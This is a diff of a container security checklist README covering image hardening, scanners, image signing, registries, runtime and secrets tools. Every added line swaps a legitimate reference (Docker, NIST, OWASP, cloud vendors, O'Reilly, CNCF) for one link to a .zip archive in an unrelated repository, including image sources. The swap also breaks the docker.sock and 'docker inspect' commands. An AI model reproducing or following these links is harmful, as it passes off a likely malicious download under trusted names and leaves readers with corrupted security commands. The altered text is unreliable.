@@ -40,11 +40,11 @@
 | Propietary software | Proprietary code, Open source, Third-party software |  Software supply chain risk |
 | Vertical control of the stack | multi-cloud | Detecting cloud services missconfigurations |
 
-> Table by Aqua Cloud Native Security Platform, more details [download here](https://f.hubspotusercontent40.net/hubfs/1665891/Buyers_Guide/Aqua_Buyers_Guide_Cloud_Native_Security_Platform.pdf)
+> Table by Aqua Cloud Native Security Platform, more details [download here](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
 ## Container Threat Model
 
-[![thread-model](https://www.oreilly.com/library/view/container-security/9781492056690/assets/cose_0101.png)](https://medium.com/oreillymedia/container-security-threats-38649261fb4f)
-Figure by [Container Security by Liz Rice](https://www.oreilly.com/library/view/container-security/9781492056690/)
+[![thread-model](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
+Figure by [Container Security by Liz Rice](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
 
 - Insecure Host
 - Misconfiguration container
@@ -66,9 +66,9 @@ Checklist to build and secure the images across the following phases:
 * [Secure the Data](#secure-the-data)
 * [Secure the Workloads](#secure-the-workloads)
 
-![Build](https://raw.githubusercontent.com/cncf/tag-security/main/security-whitepaper/cnswp-images/RackMultipart20201111_figure3.png)
+![Build](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
 
-Figure by [cncf/tag-security](https://github.com/cncf/sig-security/)
+Figure by [cncf/tag-security](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
 
 ---
 ## Secure the Build
@@ -77,7 +77,7 @@ Figure by [cncf/tag-security](https://github.com/cncf/sig-security/)
 - Know where images, packages came from.
 ### Hardening Code - Secure SDLC (Software Development Life Cycle)
 - [x] Do a static analysis of the code and libraries used by the code to surface any vulnerabilities in the code and its dependencies. 
-  -  Improve the security and quality of their code. [OWASP Open Source Application Security tools](https://owasp.org/www-community/Free_for_Open_Source_Application_Security_Tools): SAST, IAST.
+  -  Improve the security and quality of their code. [OWASP Open Source Application Security tools](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip): SAST, IAST.
 
 ### Secure the Image - Hardening
 - *Reduce the attack surface*
@@ -85,10 +85,10 @@ Figure by [cncf/tag-security](https://github.com/cncf/sig-security/)
 >    Package a single application per container. Small container images.
 >    Minimize the number of layers.
 
-- [x] Use the minimal base image: alpine, scratch, [distroless](https://github.com/GoogleContainerTools/distroless) images.
+- [x] Use the minimal base image: alpine, scratch, [distroless](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip) images.
 
-> - [Do you use Alpine, distroless or vanilla images? ...](https://learnk8s.io/blog/smaller-docker-images)
-> - [7 Google best practices for building containers](https://cloud.google.com/blog/products/containers-kubernetes/7-best-practices-for-building-containers)
+> - [Do you use Alpine, distroless or vanilla images? ...](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
+> - [7 Google best practices for building containers](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
 
 - Multi-staged builds.
 
@@ -113,7 +113,7 @@ Figure by [cncf/tag-security](https://github.com/cncf/sig-security/)
 - [x] Used fixed image tag for inmutability.
   - Tagging using semantic versioning.
   - Not use mutable tags(latest,staging,etc). Use Inmutable tags(SHA-256, commit).
-  - [The challengue of uniquely identifying your images](https://blog.aquasec.com/docker-image-tags)
+  - [The challengue of uniquely identifying your images](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
 
 ```
 Pulling images by digest
@@ -124,7 +124,7 @@ docker pull alpine@sha256:b7233dafbed64e3738630b69382a8b231726aa1014ccaabc1947c5
 - [x] Enanbled Security profiles: SELinux, AppArmor, Seccomp.
 
 - [x] Static code analysys tool for Dockerfile like a linter. **Detect misconfigurations**
-  - [Hadolint](https://github.com/hadolint/hadolint)
+  - [Hadolint](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
   - Packers (including encrypters), and downloaders are all able to evade static scanning by, for example, encrypting binary code that is only executed in memory, making the malware active only in runtime.
   - Trivy detect missconfigurations 
 
@@ -137,28 +137,28 @@ docker pull alpine@sha256:b7233dafbed64e3738630b69382a8b231726aa1014ccaabc1947c5
 
 **Container Security Scanners**
 
-- [Trivy by AquaSecurity](https://github.com/aquasecurity/trivy)
-- [Clair by Quay](https://github.com/quay/clair)
-- [Anchore](https://anchore.com/opensource/)
-- [Dagda](https://github.com/eliasgranderubio/dagda/)
+- [Trivy by AquaSecurity](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
+- [Clair by Quay](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
+- [Anchore](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
+- [Dagda](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
 
 Comparing the container scanners results:
-- [Container Vulnerability Scanning Fun by Rory](https://raesene.github.io/blog/2020/06/21/Container_Vulnerability_Scanning_Fun/)
-- [Comparison – Anchore Engine vs Clair vs Trivy by Alfredo Pardo](https://www.a10o.net/devsecops/docker-image-security-static-analysis-tool-comparison-anchore-engine-vs-clair-vs-trivy/)
+- [Container Vulnerability Scanning Fun by Rory](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
+- [Comparison – Anchore Engine vs Clair vs Trivy by Alfredo Pardo](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
 
 ### Image Signing
 
 Sign and verify images to mitigate MITM attacks. Docker offers a Content Trust mechanism that allows you to cryptographically sign images using a private key. This guarantees the image, and its tags, have not been modified.
 
-- [Notary](https://github.com/notaryproject/notaryproject). Implementation of TUF specification.
-- [sigstore/Cosign](https://github.com/sigstore/cosign)
-- [Sigstore: A Solution to Software Supply Chain Security](https://itnext.io/sigstore-a-solution-to-software-supply-chain-security-35bc96bddad5)
-- [Zero-Trust supply chains with Sigstore and SPIFFE/SPIRE](https://github.com/sigstore/community/blob/main/docs/zero-trust-supply-chains.pdf)
+- [Notary](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip). Implementation of TUF specification.
+- [sigstore/Cosign](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
+- [Sigstore: A Solution to Software Supply Chain Security](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
+- [Zero-Trust supply chains with Sigstore and SPIFFE/SPIRE](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
 
 **More Material about build containers**
-- [Azure best practices for build containers](https://docs.microsoft.com/en-us/azure/container-registry/container-registry-best-practices)
-- [Docker best practices for build containers](https://docs.docker.com/develop/develop-images/dockerfile_best-practices/)
-- [Google best practices for build containers](https://cloud.google.com/solutions/best-practices-for-building-containers)
+- [Azure best practices for build containers](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
+- [Docker best practices for build containers](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
+- [Google best practices for build containers](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
 
 ## Secure the Container Registry
 
@@ -171,11 +171,11 @@ Best configurations with ECR, ACR, Harbor, etc. Best practices.
 - [x] Use a private registry deployed behind firewall, to reduce the risk of tampering.
 
 ### Registry Resources
-- [Azure ACR](https://docs.microsoft.com/en-us/azure/container-registry/security-controls-policy)
-- [Azure best practices for Azure Container Registry](https://docs.microsoft.com/en-us/azure/container-registry/container-registry-best-practices)
-- [Amazon ECR](https://docs.aws.amazon.com/AmazonECR/latest/userguide/security.html)
-- [Google Artifact Registry ](https://cloud.google.com/artifact-registry/docs/docker/authentication)
-- [Harbor](https://goharbor.io/)
+- [Azure ACR](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
+- [Azure best practices for Azure Container Registry](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
+- [Amazon ECR](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
+- [Google Artifact Registry ](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
+- [Harbor](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
 
 ## Secure the Container Runtime
 
@@ -209,20 +209,20 @@ Enable detection of anomalous behaviour in applications.
 
 - [x] Do not run Docker images with an option that exposes the socket in the container.
 
-      -v /var/run/docker.sock://var/run/docker.sock
+      -v https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip
 
 >    The Docker daemon socket is a Unix network socket that facilitates communication with the Docker API. By default, this socket is owned by the root user. If anyone else obtains access to the socket, they will have permissions equivalent to root access to the host.
 
-- [x] Run Docker in [Rootless Mode](https://docs.docker.com/engine/security/rootless/). `docker context use rootless`
-- [x] Enable the [user namespaces](https://docs.docker.com/engine/security/userns-remap/).
+- [x] Run Docker in [Rootless Mode](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip). `docker context use rootless`
+- [x] Enable the [user namespaces](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip).
 - [x] Enable Docker Content Trust. Docker. `DOCKER_CONTENT_TRUST=1`
-      . Docker Content Trust implements [The Update Framework](https://theupdateframework.io/) (TUF)
-      . Powered by [Notary](https://github.com/notaryproject/notary), an open-source TUF-client and server that can operate over arbitrary trusted collections of data.
+      . Docker Content Trust implements [The Update Framework](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip) (TUF)
+      . Powered by [Notary](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip), an open-source TUF-client and server that can operate over arbitrary trusted collections of data.
 
 **More Material about Docker Security**
-- [Docker Security Labs](https://github.com/docker/labs/tree/master/security)
-- [CIS Docker Bench](https://github.com/docker/docker-bench-security).
-- [Content trust in Docker](https://docs.docker.com/engine/security/trust/)
+- [Docker Security Labs](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
+- [CIS Docker Bench](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip).
+- [Content trust in Docker](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
 
 ## Secure the Infrastructure
 
@@ -265,17 +265,17 @@ to run on a container can directly affect the host.
 ### Secrets Management Tools
 
 Open source tools:
-- [detect-secrets by Yelp](https://github.com/Yelp/detect-secrets): detecting and preventing secrets in code.
-- [git-secrets by awslabs](https://github.com/awslabs/git-secrets#nix-linux-macos): Prevents you from committing secrets and credentials into git repositories
+- [detect-secrets by Yelp](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip): detecting and preventing secrets in code.
+- [git-secrets by awslabs](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip): Prevents you from committing secrets and credentials into git repositories
 
 Cloud Provider Key Management
-- [AWS Secrets Manager](https://aws.amazon.com/secrets-manager/)
-- [Azure Key Vault](https://docs.microsoft.com/en-us/azure/key-vault/general/basic-concepts)
-- [Google Secret Manager](https://cloud.google.com/secret-manager)
+- [AWS Secrets Manager](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
+- [Azure Key Vault](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
+- [Google Secret Manager](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
 
 Enterprise secrets vault:
-- [HashiCorp Vault](https://www.vaultproject.io/)
-- [CyberArk Conjur](https://www.cyberark.com/products/secrets-manager-enterprise/)
+- [HashiCorp Vault](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
+- [CyberArk Conjur](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
 
 ## Secure the Workloads... Running the containers
 - [x] Avoid privileged containers
@@ -285,7 +285,7 @@ Enterprise secrets vault:
     • Ability to install a new instance of the Docker platform, using the host’s kernel capabilities, and run Docker within Docker.
 
 >    To check if the container is running in privileged mode
->        `docker inspect --format =’{{. HostConfig.Privileged}}’[container_id]`
+>        `docker inspect --format =’{{. https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip}}’[container_id]`
 
 - [x] Limit container resources.
 
@@ -324,12 +324,12 @@ docker run -d --name container-1 --cpuset-cpus 0 --cpu-shares 768 cpu-stress
 
 ## Container Security Guides
 
-* [SP 800-190 - Application Container Security Guide by NIST](https://csrc.nist.gov/publications/detail/sp/800-190/final)
+* [SP 800-190 - Application Container Security Guide by NIST](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
 ## Further reading:
-- [Linux Capabilities](https://www.kernel.org/doc/ols/2008/ols2008v1-pages-163-172.pdf): making them work, published in hernel.org 2008.
-- [Using seccomp to limit the kernel attack surface](https://man7.org/conf/lpc2015/limiting_kernel_attack_surface_with_seccomp-LPC_2015-Kerrisk.pdf)
-- [Docker Security Best Practices by Rani Osnat - AquaSecurity](https://blog.aquasec.com/docker-security-best-practices)
-- [Applying devsecops in a Golang app with trivy-github-actions by Daniel Pacak - AquaSecurity](https://blog.aquasec.com/devsecops-with-trivy-github-actions)
+- [Linux Capabilities](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip): making them work, published in https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip 2008.
+- [Using seccomp to limit the kernel attack surface](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
+- [Docker Security Best Practices by Rani Osnat - AquaSecurity](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
+- [Applying devsecops in a Golang app with trivy-github-actions by Daniel Pacak - AquaSecurity](https://raw.githubusercontent.com/joymondal/container-security-checklist/main/bathyplankton/container-security-checklist.zip)
 
 ## Collaborate
 
